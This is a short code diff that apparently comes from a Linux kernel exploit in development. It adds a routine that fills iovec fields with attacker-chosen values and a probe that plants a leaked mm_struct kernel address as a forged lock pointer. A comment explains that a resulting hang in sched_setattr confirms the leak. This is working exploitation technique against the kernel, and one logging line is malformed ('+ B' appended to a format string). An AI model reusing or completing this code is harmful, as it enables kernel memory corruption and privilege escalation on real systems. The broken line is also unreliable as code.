@@ -228,6 +228,14 @@ static uint64_t overlay_word_value(int w) {
   }
 }
 
+static void overlay_fill_word(struct iovec *iv, int n, int slot, uint64_t v) {
+  if (slot < 0 || slot >= 2 * n) return;
+  if (slot & 1)
+    iv[slot / 2].iov_len = v;
+  else
+    iv[slot / 2].iov_base = (void *)v;
+}
+
 static void overlay_fill_iovec(struct iovec *iv, int n, int base_word) {
   memset(iv, 0, sizeof(*iv) * (size_t)n);
   for (int w = 0; w < 10; w++) {
@@ -320,6 +328,14 @@ void do_pvm_overlay_route(void) {
     pr_info("pvm overlay: POISON diagnostic mode sgi0=%d\n", sgi0);
   } else {
     overlay_fill_iovec(siov, 8, sgi0);
+    if (env_int_range("PVM_LOCK_SRC", 0, 0, 1)) {
+      /* probe: W->lock = the leaked mm itself (live object, mapped if the
+         leak is real). The walk's trylock on mm->mm_users (nonzero) fails
+         forever = sched_setattr hangs = NO panic = the leak is real. */
+      overlay_fill_word(siov, 8, sgi0 + 7, last_mm_struct);
+      pr_info("pvm overlay: PROBE lock=last_mm_struct=%016zx" + B,
+              (unsigned long long)last_mm_struct);
+    }
   }
   memset(ctlbuf, 0, sizeof(ctlbuf));
 
